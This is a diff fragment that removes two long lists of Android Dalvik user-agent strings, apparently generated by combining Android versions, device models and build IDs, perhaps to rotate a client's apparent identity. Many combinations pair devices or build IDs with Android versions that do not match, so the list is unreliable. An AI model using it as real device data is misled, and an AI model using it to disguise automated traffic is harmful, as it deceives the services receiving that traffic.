-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/NRD90M)"
-
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-A320F Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; Redmi Note 8 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 8.1.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-J500H Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 5.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/KTU84P)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G973N Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; SM-G973N Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 7.0; Redmi Note 8 Build/PPR1.910397.817)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/NRD90M)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-G973N Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 4.4.4; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J500H Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-A320F Build/LMY47X)",
-    "Dalvik/2.1.0 (Linux; U; Android 9; CPH1909 Build/MMB29K)",
-    "Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-G973N Build/LMY47X)",
